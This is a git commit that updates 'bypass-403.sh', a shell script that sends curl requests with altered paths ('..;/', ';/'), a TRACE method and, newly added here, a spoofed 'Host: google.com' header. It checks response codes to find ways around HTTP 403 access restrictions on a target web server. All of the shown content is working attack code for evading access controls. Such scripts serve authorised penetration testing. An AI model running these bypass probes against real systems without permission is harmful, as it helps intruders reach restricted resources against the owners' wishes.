e7c55956bc4b89c330a972e8c6cd0561d19b52dd
jedai47 <47899257+jedai47@users.noreply.github.com>
2022-06-14 11:54:07 +0200

    Update bypass-403.sh

--- bypass-403.sh
+++ bypass-403.sh
@@ -51,6 +51,7 @@ curl -s -o /dev/null -i -w "%{http_code}","%{size_download}" "$1/$2..;/"
 echo "  --> ${1}/${2}..;/"
 curl -s -o /dev/null -i -w "%{http_code}","%{size_download}" " $1/$2;/"
 echo "  --> ${1}/${2};/"
-#updated
 curl -k -s -o /dev/null -i -w "%{http_code}","%{size_download}" -X TRACE $1/$2
 echo "  --> ${1}/${2} -X TRACE"
+curl -s -o /dev/null -i -w "%{http_code}","%{size_download}" -H "Host: google.com" $1/$2
+echo "  --> ${1}/${2} -H Host: google.com"
